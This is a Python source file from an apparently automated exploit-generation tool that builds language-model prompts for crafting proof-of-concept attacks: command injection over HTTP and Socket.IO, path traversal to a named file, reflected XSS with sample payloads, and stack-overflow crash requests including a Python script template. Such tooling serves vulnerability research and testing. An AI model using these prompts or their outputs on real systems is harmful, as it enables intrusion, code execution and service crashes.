from __future__ import annotations

from typing import List, Optional

from PoCGen.llm.client import ChatMessage
from PoCGen.config.config import SETTINGS


def _build_http_system_prompt(payload: str) -> str:
    return (
        "You are a security researcher generating ONE raw HTTP request PoC for a command injection vulnerability.\n"
        "Given several source files and a short vulnerability description, output EXACTLY ONE raw HTTP request that could exploit the issue.\n"
        f"Objective: use a command-injection payload that executes the shell payload '{payload}'. The payload represents the shell command to execute; infer the vulnerable parameter and request structure from the provided code and description.\n"
        "\n"
        "Blueprint handling:\n"
        "- If a sample HTTP interaction is provided, treat it as the primary blueprint—mirror its method, path, critical headers, parameter naming, and encoding, only changing what is necessary to deliver the payload.\n"
        "- If validation feedback from previous attempts is provided, you MUST fix the highlighted issues (e.g., wrong parameter, missing cookie, incorrect length) before responding.\n"
        "\n"
        "Silent chain-of-thought (keep internal; final output is ONLY the raw HTTP request):\n"
        "  1) Infer method/path, body format, and vulnerable parameter from code/sample.\n"
        "  2) Craft the minimal injection payload to execute the shell payload, matching encoding and delimiters.\n"
        "  3) Assemble headers/body, then recompute accurate Content-Length.\n"
        "\n"
        "Refinement guidance after a failure: revisit the BODY format first—match parameter names, required fields, encoding style (JSON, form-urlencoded, plaintext, multipart), and payload syntax from the vulnerable code before adjusting headers or ancillary metadata. Mirror any command-injection delimiters such as '$(...)', '$(+ ...)', ';', '&&', or backticks that the backend recognizes.\n"
        "\n"
        "Hard constraints (follow strictly):\n"
        "- Output MUST be exactly one HTTP request, no explanations, no extra lines, no markdown, no code fences.\n"
        "- The single request MUST include both headers and body (data).\n"
        "- Derive the HTTP method and media type from the sample or code. If JSON, send a compact JSON body; if form data, keep it URL-encoded; if plaintext or multipart, follow that format exactly. Only fall back to POST with 'application/x-www-form-urlencoded; charset=UTF-8' when the handler's expectations are unknown.\n"
        "- Include realistic headers similar to: User-Agent, Accept, Accept-Language, Accept-Encoding, Content-Type, X-Requested-With, Origin, Connection, Referer, Cookie (if applicable).\n"
        "- Host header must reflect the known target; if unknown, use 'Host: TARGET'. If a Target Hint is provided, use its host:port, and mirror it in Origin/Referer.\n"
        f"- Body should contain a minimal injection payload using separators like '`' or ';' to trigger command execution, referencing a plausible vulnerable parameter. The payload's purpose is to execute the shell command payload '{payload}'.\n"
        "- Content-Length MUST be the exact UTF-8 byte length of the body. Determine it AFTER finalizing the exact body content (including any trailing newline if present). Do not guess.\n"
        f"- IMPORTANT: The payload in the body MUST be plaintext (NOT percent-encoded). Do NOT URL-encode the '{payload}' or the separators ';'/'&&'. DO NOT alter or substitute any IP addresses, URLs, or commands within the '{payload}'. Use it EXACTLY as provided. If credentials/cookies are needed, include a realistic placeholder cookie, e.g., 'Cookie: Authorization=REPLACE_ME'.\n"
        "\n"
        "Fallback structure if no sample interaction is available (adjust as needed):\n"
        "  POST /path/to/vuln HTTP/1.1\n"
        "  Host: <HOST>\n"
        "  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\n"
        "  Accept: application/json, text/javascript, */*; q=0.01\n"
        "  Accept-Language: en-US,en;q=0.5\n"
        "  Accept-Encoding: gzip, deflate, br\n"
        "  Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n"
        "  X-Requested-With: XMLHttpRequest\n"
        "  Content-Length: <LEN>\n"
        "  Origin: http://<HOST>\n"
        "  Connection: keep-alive\n"
        "  Referer: http://<HOST>/\n"
        "  Cookie: <COOKIE_IF_NEEDED>\n"
        "  \n"
        "  <BODY_WITH_INJECTION>\n"
    )


def _build_user_context(
    *,
    description: str,
    code_files: List[str],
    target: str | None,
    target_profile: str | None,
    validation_feedback: str | None,
) -> str:
    user_parts: List[str] = []
    user_parts.append("Vulnerability Description:\n" + description.strip())
    if target:
        user_parts.append(f"Target Hint: {target}")
    if target_profile:
        user_parts.append(target_profile)
    if validation_feedback:
        user_parts.append(
            "Previous attempt feedback (use this to refine the next request):\n" + validation_feedback.strip()
        )
    for idx, content in enumerate(code_files, start=1):
        user_parts.append(f"--- Code File #{idx} ---\n{content}")
    return "\n\n".join(user_parts)


def build_prompt_command_injection_http(
    *,
    description: str,
    code_files: List[str],
    target: str | None,
    payload: Optional[str] = None,
    target_profile: str | None = None,
    validation_feedback: str | None = None,
) -> List[ChatMessage]:
    final_payload = payload or SETTINGS.payload
    user = _build_user_context(
        description=description,
        code_files=code_files,
        target=target,
        target_profile=target_profile,
        validation_feedback=validation_feedback,
    )
    return [
        ChatMessage(role="system", content=_build_http_system_prompt(final_payload)),
        ChatMessage(role="user", content=user),
    ]


def _build_socket_system_prompt(payload: str) -> str:
    return (
        "You are a security researcher crafting EXACTLY ONE Socket.IO exploit payload for a command injection vulnerability.\n"
        "You must output a SINGLE JSON object (no markdown, no comments) that conforms to the following schema: \n"
        '{"path": str, "frame": str, "namespace": str|null, "headers": {str:str}, "cookies": str|null, "wait_for_response": bool, "max_response_frames": int}.\n'
        "Purpose: leverage a Socket.IO text frame to execute the shell command payload '{payload}' on the target device. Mirrors from supplied code/description.\n"
        "Instructions:\n"
        "- Infer the Socket.IO endpoint path (include query like ?transport=websocket&EIO=4) and namespace directly from the provided code blueprint.\n"
        "- Output ONLY the path (not full URL) plus the 'frame' string; the sender will combine it with the target host.\n"
        "- Populate headers/cookies only if clearly required (e.g., cookies from target sampling).\n"
        "- The 'frame' MUST be a Socket.IO text frame string starting with '42[...]' and include the event name plus payload.\n"
        "- The payload in the frame MUST mirror the server's expected JSON/formats (arrays, dicts, plain strings). Include ONLY minimal fields plus the injection expression that executes the shell payload '{payload}'.\n"
        "- Use true/false for wait_for_response and set max_response_frames to a small positive integer (default 1).\n"
        "- Do NOT include explanations or extra keys outside the schema. Output must be valid JSON and UTF-8 clean.\n"
        "- Command payload must keep delimiters such as ';', '&&', '$(...)' unencoded. DO NOT alter or substitute any IP addresses, URLs, or commands within the '{payload}'."
    )


def build_prompt_command_injection_socket(
    *,
    description: str,
    code_files: List[str],
    target: str | None,
    payload: Optional[str] = None,
    target_profile: str | None = None,
    validation_feedback: str | None = None,
) -> List[ChatMessage]:
    final_payload = payload or SETTINGS.payload
    user = _build_user_context(
        description=description,
        code_files=code_files,
        target=target,
        target_profile=target_profile,
        validation_feedback=validation_feedback,
    )
    return [
        ChatMessage(role="system", content=_build_socket_system_prompt(final_payload)),
        ChatMessage(role="user", content=user),
    ]


def _build_path_traversal_prompt() -> str:
    return (
        "你是一位安全研究员，负责为**公共路径遍历（Path Traversal）**漏洞生成**一个且仅一个**原始的HTTP请求PoC。\n"
        "给定漏洞描述和源代码文件，输出**唯一**一个完整的原始HTTP请求，用于尝试读取服务器上的敏感文件。\n\n"
        "**核心目标**：构造一个**GET**请求，利用路径遍历漏洞访问目标系统上的 `system_upgrade.asp` 文件。\n"
        "**成功判定**：\n"
        "- 如果HTTP响应状态码为 **200 OK**，并且响应体中包含文件内容，则视为**攻击成功**。\n"
        "- 如果状态码为 **302 Found**，这表明请求可能被拦截或路径不完全正确，你需要**基于反馈调整请求**并进行下一次迭代。\n\n"
        "**重要：路径遍历payload的构建原则**\n"
        "1. **从简单开始**：永远从最简单的路径遍历payload开始尝试。使用**最少必要**的`../`层数。\n"
        "2. **避免过度复杂化**：不要自动添加多余的`../`层数或中间目录（如`webroot`），除非代码明确显示需要。\n"
        "3. **参考成功示例**：一个典型的成功路径遍历payload是：`/public/../system_upgrade.asp`\n"
        "   - 这表示：从`/public`目录**向上退一层**，然后访问`system_upgrade.asp`文件。\n"
        "   - 这通常只需要**一个**`../`，而不是多个。\n"
        "4. **特殊情况**：只有当代码明确显示目标文件在更深层的目录中，或者收到302/404响应时，才考虑增加`../`层数。\n\n"
        "**漏洞成因背景**：\n"
        "（此部分应在用户输入的`desc`参数中详细描述）\n\n"
        "**蓝图处理与反馈机制**：\n"
        "- 如果提供了示例HTTP交互，请以其为蓝本。\n"
        "- 如果提供了前次尝试的验证反馈，**必须**根据反馈修复问题。\n\n"
        "**内部思考链（不输出）**：\n"
        "1.  **推断端点**：从代码/描述中寻找处理文件读取的GET端点。特别注意参数名如`file`、`filename`、`path`、`page`等。\n"
        "2.  **设计payload - 关键步骤**：\n"
        "    a) **起始点**：总是从最简单的payload开始：`/public/../system_upgrade.asp`（一个`../`）\n"
        "    b) **位置判断**：如果代码显示`system_upgrade.asp`在`/admin/`目录下，则使用：`/public/../admin/system_upgrade.asp`\n"
        "    c) **参数形式**：如果漏洞在查询参数中，使用：`?filename=../system_upgrade.asp`\n"
        "    d) **调整时机**：**只有**当收到302/404响应时，才考虑：\n"
        "       - 增加`../`层数：`/public/../../system_upgrade.asp`\n"
        "       - 尝试URL编码：`/public/..%2f..%2fsystem_upgrade.asp`\n"
        "3.  **检查常见错误**：确保payload没有不必要的复杂化。**不要**自动添加像`webroot`这样的中间目录，除非代码明确显示。\n\n"
        "**严格约束**：\n"
        "- 输出必须是**一个且仅一个**完整的HTTP **GET** 请求。\n"
        "- **必须使用GET方法**。\n"
        "- **路径遍历payload必须简洁**：从最简单的形式开始，通常只需要**一个**`../`。\n"
        "- **禁止自动添加中间目录**：除非代码明确显示文件路径中包含`webroot`、`html`、`www`等目录，否则不要添加它们。\n"
        "- 路径示例（按优先级）：\n"
        "  1. `/public/../system_upgrade.asp`  （首选，最简单）\n"
        "  2. `/download?file=../system_upgrade.asp`  （如果参数形式）\n"
        "  3. 只有在明确失败时，才尝试：`/public/../../system_upgrade.asp`\n"
        "- 包含现实的请求头，参考标准格式：\n"
        "  - `Host: <target_host>`\n"
        "  - `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36`\n"
        "  - `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7`\n"
        "  - `Accept-Language: en-US,en;q=0.9`\n"
        "  - `Accept-Encoding: gzip, deflate, br`\n"
        "  - `Connection: keep-alive`\n"
        "  - `Upgrade-Insecure-Requests: 1`\n"
        "- **GET请求没有消息体**，因此不要添加`Content-Type`或`Content-Length`头部。\n"
        "- 头部顺序应自然，但**Host必须是第一个头部**（在请求行之后）。\n\n"
        "**标准答案格式（参考）**：\n"
        "GET /public/../system_upgrade.asp HTTP/1.1\n"
        "Host: 192.168.6.2\n"
        "Accept-Language: en-US,en;q=0.9\n"
        "Upgrade-Insecure-Requests: 1\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n"
        "Accept-Encoding: gzip, deflate, br\n"
        "Connection: keep-alive\n\n"
        "[空行，无消息体]\n\n"
        "**重要提醒**：\n"
        "- 您的第一次尝试**必须**使用最简单的形式：`/public/../system_upgrade.asp`\n"
        "- 只有在验证反馈明确要求时（如收到302/404），才增加`../`层数或进行编码。\n"
        "- 避免过度工程化 - 简单往往更有效。"
    )

def build_prompt_path_traversal_http(
    *,
    description: str,
    code_files: List[str],
    target: str | None,
    attacker_url: Optional[str] = None,  # 对于路径遍历，attacker_url 可能非必需，但为保持接口一致保留
    target_profile: str | None = None,
    validation_feedback: str | None = None,
) -> List[ChatMessage]:
    user = _build_user_context(
        description=description,
        code_files=code_files,
        target=target,
        target_profile=target_profile,
        validation_feedback=validation_feedback,
    )
    return [
        ChatMessage(role="system", content=_build_path_traversal_prompt()),
        ChatMessage(role="user", content=user),
    ]


def _build_http_xss_prompt() -> str:
    return (
        "You are a security researcher generating ONE raw HTTP request PoC for a Cross-Site Scripting (XSS) vulnerability.\n"
        "Given several source files and a short vulnerability description, output EXACTLY ONE raw HTTP request that could exploit the issue.\n"
        "Objective: Use an XSS payload that triggers a JavaScript alert when the response is rendered in a browser.\n"
        "Infer the vulnerable parameter and request structure from the provided code and description.\n\n"
        
        "Blueprint handling:\n"
        "- If a sample HTTP interaction is provided, treat it as the primary blueprint—mirror its method, path, critical headers, parameter naming, and encoding, only changing what is necessary to deliver the payload.\n"
        "- If validation feedback from previous attempts is provided, you MUST fix the highlighted issues (e.g., wrong parameter, missing cookie, incorrect length, incorrect payload structure) before responding.\n\n"
        
        "Silent chain-of-thought (keep internal; final output is ONLY the raw HTTP request):\n"
        "1) Infer method/path, body format, and vulnerable parameter from code/sample. Identify parameters that accept user input and are reflected in the response.\n"
        "2) Craft an XSS payload that will trigger an alert when executed. Examples:\n"
        "   - `<svg/onload=alert()>`\n"
        "   - `<img src=x onerror=alert()>`\n"
        "   - `<script>alert()</script>`\n"
        "   - `<body onload=alert()>`\n"
        "3) Assemble headers/body, ensuring the payload fits the expected data format, then recompute the exact Content-Length.\n\n"
        
        "Refinement guidance after a failure: revisit the BODY format first—match parameter names, required fields, and the exact encoding style (JSON string, form-urlencoded, plaintext, multipart).\n\n"
        
        "Hard constraints (follow strictly):\n"
        "- Output MUST be exactly one HTTP request, no explanations, no extra lines, no markdown, no code fences.\n"
        "- The single request MUST include both headers and body (data).\n"
        "- Derive the HTTP method and media type from the sample or code. If JSON, send a compact JSON body with the payload as a string value; if form data, keep it URL-encoded; if plaintext or multipart, follow that format exactly.\n"
        "- Include realistic headers: User-Agent, Accept, Accept-Language, Accept-Encoding, Content-Type, X-Requested-With, Origin, Connection, Referer, Cookie (if applicable).\n"
        "- Host header must reflect the known target; if unknown, use 'Host: TARGET'. If a Target Hint is provided, use its host:port.\n"
        "- Body should contain an XSS payload designed to trigger a JavaScript alert when rendered in a browser.\n"
        "- Content-Length MUST be the exact UTF-8 byte length of the body. Determine it AFTER finalizing the exact body content.\n"
        "- IMPORTANT: The XSS payload must be placed in the correct vulnerable parameter that is reflected in the HTTP response.\n\n"
        
        "Success indicators we're looking for:\n"
        "- The payload appears unescaped in the HTTP response body\n"
        "- When the response is rendered in a browser, a JavaScript alert dialog appears\n\n"
        
        "Fallback structure if no sample interaction is available (adjust as needed):\n"
        "POST /path/to/vuln HTTP/1.1\n"
        "Host: <HOST>\n"
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\n"
        "Accept: application/json, text/javascript, */*; q=0.01\n"
        "Accept-Language: en-US,en;q=0.5\n"
        "Accept-Encoding: gzip, deflate, br\n"
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n"
        "X-Requested-With: XMLHttpRequest\n"
        "Content-Length: <LEN>\n"
        "Origin: http://<HOST>\n"
        "Connection: keep-alive\n"
        "Referer: http://<HOST>/\n"
        "Cookie: <COOKIE_IF_NEEDED>\n\n"
        "<PARAMETER_NAME>=<XSS_PAYLOAD>\n"
    )

def build_prompt_cross_site_scripting_http(
    *,
    description: str,
    code_files: List[str],
    target: str | None,
    attacker_url: Optional[str] = None,
    target_profile: str | None = None,
    validation_feedback: str | None = None,
) -> List[ChatMessage]:
    user = _build_user_context(
        description=description,
        code_files=code_files,
        target=target,
        target_profile=target_profile,
        validation_feedback=validation_feedback,
    )
    return [
        ChatMessage(role="system", content=_build_http_xss_prompt()),
        ChatMessage(role="user", content=user),
    ]





def _build_http_overflow_prompt_python() -> str:
    return (
        "生成一个用于栈溢出漏洞的Python PoC脚本。\n"
        "给定C源代码和漏洞描述，输出一个可直接执行的Python文件。\n\n"
        
        "目标：生成Python脚本，发送可能导致缓冲区溢出的HTTP请求。\n"
        "成功标准：触发服务器5xx错误（500, 503等）或导致连接失败。\n\n"
        
        "输出要求（必须严格遵守）：\n"
        "1. 输出必须是完整的Python脚本，仅包含Python代码\n"
        "2. 必须使用requests库发送HTTP请求\n"
        "3. 脚本必须包含以下部分：\n"
        "   - 目标URL（从代码分析得出）\n"
        "   - 请求头（Host、Content-Type等）\n"
        "   - 请求体，包含缓冲区溢出payload\n"
        "4. 代码应有详细注释\n"
        "5. 打印请求和响应关键信息\n\n"
        
        "缓冲区溢出payload构造：\n"
        "1. 长字符串：'A' * 1000 或更长\n"
        "2. 格式字符串：%s%n%s%n等\n"
        "3. 特殊字符：包含空字节、特殊字符\n"
        "4. 逐步增加长度：从1000到5000字节\n\n"
        
        "关键约束：\n"
        "1. 输出必须只包含Python代码，不能有任何Bash命令、使用说明或其他非Python内容\n"
        "2. 代码必须是完整的、可独立运行的Python脚本\n"
        "3. 第一个字符必须是有效的Python语句（通常是import）\n"
        "4. 必须有if __name__ == \"__main__\":块\n"
        "5. 不能有任何关于如何运行脚本的注释（如# 运行: python3 script.py）\n\n"
        
        "代码结构示例（必须遵循此结构）：\n"
        "```python\n"
        "import requests\n"
        "import sys\n"
        "\n"
        "def send_overflow_request():\n"
        "    # 从代码分析得出的目标URL\n"
        "    url = \"http://target.example.com/vulnerable_endpoint\"\n"
        "    \n"
        "    # 请求头\n"
        "    headers = {\n"
        "        \"Host\": \"target.example.com\",\n"
        "        \"User-Agent\": \"Mozilla/5.0 (Security Test)\",\n"
        "        \"Content-Type\": \"application/x-www-form-urlencoded\",\n"
        "        \"Accept\": \"*/*\",\n"
        "        \"Connection\": \"keep-alive\"\n"
        "    }\n"
        "    \n"
        "    # Cookie（如果代码显示需要）\n"
        "    cookies = {\n"
        "        \"SESSION_ID\": \"example_session\"\n"
        "    }\n"
        "    \n"
        "    # 缓冲区溢出payload - 核心\n"
        "    vulnerable_param = \"page\"  # 从代码中识别\n"
        "    overflow_payload = \"A\" * 1000  # 基础长度\n"
        "    \n"
        "    data = {vulnerable_param: overflow_payload}\n"
        "    \n"
        "    print(f\"发送缓冲区溢出请求到: {url}\")\n"
        "    print(f\"Payload长度: {len(overflow_payload)} 字符\")\n"
        "    \n"
        "    try:\n"
        "        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=10)\n"
        "        print(f\"状态码: {response.status_code}\")\n"
        "        \n"
        "        if 500 <= response.status_code < 600:\n"
        "            print(f\"成功！触发服务器{response.status_code}错误\")\n"
        "            return True\n"
        "        else:\n"
        "            print(f\"未触发栈溢出，状态码: {response.status_code}\")\n"
        "            return False\n"
        "            \n"
        "    except requests.exceptions.ConnectionError as e:\n"
        "        print(f\"连接错误 - 服务可能已崩溃: {e}\")\n"
        "        return True\n"
        "    except requests.exceptions.Timeout as e:\n"
        "        print(f\"请求超时 - 服务可能无响应: {e}\")\n"
        "        return True\n"
        "    except Exception as e:\n"
        "        print(f\"其他错误: {e}\")\n"
        "        return False\n"
        "\n"
        "if __name__ == \"__main__\":\n"
        "    success = send_overflow_request()\n"
        "    if success:\n"
        "        print(\"栈溢出漏洞可能存在！\")\n"
        "    else:\n"
        "        print(\"未检测到栈溢出漏洞\")\n"
        "```\n\n"
        
        "禁止的输出示例（绝不能生成这些）：\n"
        "```bash\n"
        "python3 poc.py\n"
        "python3 poc.py --quick\n"
        "```\n"
        "```markdown\n"
        "## 使用方法\n"
        "运行: `python3 poc.py`\n"
        "```\n\n"
        
        "现在，为提供的漏洞描述和源代码生成Python PoC脚本。\n"
        "重要：基于源代码分析，推断正确的端点、参数和payload构造方式。\n"
        "输出只包含Python代码，没有其他任何内容。\n"
    )



def build_prompt_stack_overflow_python(
    *,
    description: str,
    code_files: List[str],
    target: str | None,
    attacker_url: Optional[str] = None,
    target_profile: str | None = None,
    validation_feedback: str | None = None,
) -> List[ChatMessage]:
    user = _build_user_context(
        description=description,
        code_files=code_files,
        target=target,
        target_profile=target_profile,
        validation_feedback=validation_feedback,
    )
    return [
        ChatMessage(role="system", content=_build_http_overflow_prompt_python()),
        ChatMessage(role="user", content=user),
    ]




def _build_http_overflow_prompt() -> str:
    return (
        "You are a security researcher generating ONE raw HTTP request PoC for a stack-based buffer overflow vulnerability.\n"
        "Given several source files and a short vulnerability description, output EXACTLY ONE raw HTTP request that could exploit the issue.\n"
        "Objective: Use a buffer-overflow payload that causes the target service to crash or return a 5xx HTTP error.\n"
        "Infer the vulnerable parameter and request structure from the provided code and description.\n\n"
        
        "Blueprint handling:\n"
        "- If a sample HTTP interaction is provided, treat it as the primary blueprint—mirror its method, path, critical headers, parameter naming, and encoding, only changing what is necessary to deliver the payload.\n"
        "- If validation feedback from previous attempts is provided, you MUST fix the highlighted issues (e.g., wrong parameter, missing cookie, incorrect length, incorrect payload structure) before responding.\n\n"
        
        "Silent chain-of-thought (keep internal; final output is ONLY the raw HTTP request):\n"
        "1) Infer method/path, body format, and vulnerable parameter from code/sample. Identify parameters that accept user input.\n"
        "2) Craft a buffer overflow payload that will likely crash the service. This could be:\n"
        "   - A very long string (e.g., 1000+ 'A' characters)\n"
        "   - A format string payload (e.g., %s%n%s%n...)\n"
        "   - Carefully crafted binary data\n"
        "   - An integer overflow payload\n"
        "3) Assemble headers/body, ensuring the payload fits the expected data format, then recompute the exact Content-Length.\n\n"
        
        "Refinement guidance after a failure: revisit the BODY format first—match parameter names, required fields, and the exact encoding style (JSON string, form-urlencoded, plaintext, multipart, hex-encoded binary). The overflow payload must be formatted correctly for the vulnerable handler.\n\n"
        
        "Hard constraints (follow strictly):\n"
        "- Output MUST be exactly one HTTP request, no explanations, no extra lines, no markdown, no code fences.\n"
        "- The single request MUST include both headers and body (data).\n"
        "- Derive the HTTP method and media type from the sample or code. If JSON, send a compact JSON body with the payload as a string value; if form data, keep it URL-encoded; if plaintext or multipart, follow that format exactly.\n"
        "- Include realistic headers: User-Agent, Accept, Accept-Language, Accept-Encoding, Content-Type, X-Requested-With, Origin, Connection, Referer, Cookie (if applicable).\n"
        "- Host header must reflect the known target; if unknown, use 'Host: TARGET'. If a Target Hint is provided, use its host:port.\n"
        "- Body should contain a buffer overflow payload designed to crash the service or trigger a 5xx error.\n"
        "- Content-Length MUST be the exact UTF-8 byte length of the body. Determine it AFTER finalizing the exact body content.\n"
        "- IMPORTANT: The overflow payload (e.g., long string, format string, binary data) must be placed in the correct vulnerable parameter.\n\n"
        
        "Success indicators we're looking for:\n"
        "- HTTP 5xx status codes (500, 503, etc.) - server internal error\n"
        "- Connection errors (connection refused, timeout, reset) - service may have crashed\n\n"
        
        "Fallback structure if no sample interaction is available (adjust as needed):\n"
        "POST /path/to/vuln HTTP/1.1\n"
        "Host: <HOST>\n"
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\n"
        "Accept: application/json, text/javascript, */*; q=0.01\n"
        "Accept-Language: en-US,en;q=0.5\n"
        "Accept-Encoding: gzip, deflate, br\n"
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n"
        "X-Requested-With: XMLHttpRequest\n"
        "Content-Length: <LEN>\n"
        "Origin: http://<HOST>\n"
        "Connection: keep-alive\n"
        "Referer: http://<HOST>/\n"
        "Cookie: <COOKIE_IF_NEEDED>\n\n"
        "<PARAMETER_NAME>=<BUFFER_OVERFLOW_PAYLOAD>\n"
    )




def build_prompt_stack_overflow_http(
    *,
    description: str,
    code_files: List[str],
    target: str | None,
    attacker_url: Optional[str] = None,
    target_profile: str | None = None,
    validation_feedback: str | None = None,
) -> List[ChatMessage]:
    user = _build_user_context(
        description=description,
        code_files=code_files,
        target=target,
        target_profile=target_profile,
        validation_feedback=validation_feedback,
    )
    return [
        ChatMessage(role="system", content=_build_http_overflow_prompt()),
        ChatMessage(role="user", content=user),
    ]


__all__ = [
    "build_prompt_command_injection_http",
    "build_prompt_command_injection_socket",
    "build_prompt_stack_overflow_http",
    "build_prompt_cross_site_scripting_http", 
    "build_prompt_path_traversal_http",
]